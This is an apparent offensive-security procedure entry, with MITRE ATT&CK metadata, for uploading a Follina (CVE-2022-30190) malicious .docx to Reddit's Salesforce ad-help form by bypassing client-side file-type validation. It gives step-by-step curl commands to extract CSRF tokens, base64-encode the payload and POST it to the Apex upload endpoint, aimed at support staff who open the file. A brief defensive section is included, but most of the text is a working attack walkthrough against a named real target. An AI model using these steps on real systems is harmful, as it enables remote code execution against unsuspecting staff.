---
id: proc-salesforce-upload-bypass
tags:
  - unrestricted-file-upload
  - salesforce
  - follina
  - bypass
  - rce
type: procedure
tools: []
tactics:
  - '[[Initial Access]]'
  - '[[Execution]]'
commands:
  - '[[commands/curl-http-post-upload]]'
verified: false
platforms:
  - Web
  - Cloud (Salesforce)
submitted: true
created_at: '2023-10-01T00:00:00Z'
techniques:
  - '[[Exploit Public-Facing Application]]'
  - '[[Remote File Copy]]'
  - '[[Exploitation for Client Execution]]'
updated_at: '2025-12-14T05:32:13.272Z'
skill_level: intermediate
impact_level: high
detection_risk: low
sub_techniques: []
validated: true
mitre_tactics:
  - '[[Initial Access]]'
  - '[[Execution]]'
mitre_techniques:
  - '[[Exploit Public-Facing Application]]'
  - '[[Remote File Copy]]'
  - '[[Exploitation for Client Execution]]'
---
# Bypass Client-Side Validation for Malicious File Upload

## Summary

This procedure exploits an unrestricted file upload vulnerability in a Salesforce form by bypassing client-side JavaScript validation that restricts drag-and-drop to specific file types (jpg, jpeg, gif, png, pdf). Using the 'Click to browse' option allows uploading arbitrary files, such as a malicious .docx exploiting CVE-2022-30190 (Follina), without server-side enforcement, potentially leading to remote code execution when victims preview the file in Microsoft Word.

## Description

The target is Reddit's Salesforce instance at https://reddit.secure.force.com/adhelp, where the AdvertisingHelpController.uploadFile method handles uploads. Client-side code blocks drag-and-drop for non-allowed types, but the browse dialog lacks this check, sending the file via POST to /adhelp/apexremote as base64-encoded JSON. The server accepts any file type, enabling upload of Follina-payload .docx files. If a victim (e.g., support staff) opens it in Word with details view, it triggers MSDT URL protocol for RCE. Prerequisites include a crafted malicious .docx and form tokens (CSRF, VID).

## Requirements

1. Public access to https://reddit.secure.force.com/adhelp
2. Malicious .docx file base64-encoded (exploiting CVE-2022-30190)
3. Extract CSRF token and visitor ID from form page source
4. Tools for HTTP requests (e.g., curl) and base64 encoding

## Defense

Defensive measures and detection strategies:

- Implement server-side MIME type and extension validation on uploads
- Scan uploaded files for known exploits (e.g., Follina signatures) using antivirus
- Disable automatic preview in document handlers like Word
- Monitor upload endpoints for anomalous file types and base64 payloads
- Use WAF rules to block non-standard file uploads to Apex endpoints

## Objectives

1. Upload arbitrary files bypassing client-side restrictions
2. Confirm server-side lack of validation
3. Deliver Follina payload for potential client-side RCE
4. Gain initial access via exploited public-facing application

## Instructions

### Step 1: Access Form and Extract Tokens

**Context**: Load the form to observe restrictions and gather session tokens needed for the request.

**Command** ([[commands/curl-http-post-upload]]):

First, fetch the page to extract CSRF and VID (manually inspect or use browser dev tools):

```bash
curl -s https://reddit.secure.force.com/adhelp > form.html
```

> Parse form.html for ctx.csrf and ctx.vid values. Expected output: HTML with JSON-like ctx object.

### Step 2: Prepare Malicious Payload

**Context**: Encode the Follina-exploiting .docx as base64 for JSON inclusion.

**Command** (base64):

```bash
echo -n $(cat malicious.docx) | base64 > payload.b64
```

> This generates the base64 string for data[0]. Expected output: Base64 file content.

### Step 3: Test Drag-and-Drop Block

**Context**: Verify client-side validation blocks .docx via drag-and-drop (manual browser test).

**Instructions**: In browser, drag .docx to form area; confirm JS error.

> No command; browser interaction. Expected output: Validation popup or rejection.

### Step 4: Upload via Browse Bypass

**Context**: Use browse to select and submit, or simulate with curl.

**Command** ([[commands/curl-http-post-upload]]):

```bash
curl -X POST https://reddit.secure.force.com/adhelp/apexremote \
  -H "Content-Type: application/json" \
  -H "Host: reddit.secure.force.com" \
  -d '{"action":"AdvertisingHelpController","method":"uploadFile","data":["$(cat payload.b64)","","Dummy Data.docx","5005c000017FCu8AAG","YOUR_IP"],"type":"rpc","tid":3,"ctx":{"csrf":"EXTRACTED_CSRF","vid":"EXTRACTED_VID","ns":"","ver":41}}'
```

> Submits the payload. Replace placeholders. Expected output: JSON response.

### Step 5: Validate Upload Success

**Context**: Check response for successful upload ID.

**Instructions**: Inspect curl output for statusCode 200 and result ID.

> Expected output: {"statusCode":200,"result":"00P5c00001leROKEA2"}. Success if no rejection.

## MITRE ATT&CK Mapping

### Tactics

- [[Initial Access]] Initial Access
- [[Execution]] Execution

### Techniques

- [[Exploit Public-Facing Application]] Exploit Public-Facing Application
- [[Remote File Copy]] Ingress Tool Transfer
- [[Exploitation for Client Execution]] Exploitation for Client Execution

### Sub-Techniques

- N/A

## Commands Used

- [[commands/curl-http-post-upload]]

## Tools Used

- None

## Tags

- [[unrestricted-file-upload]]
- [[salesforce]]
- [[follina]]
- [[rce]]
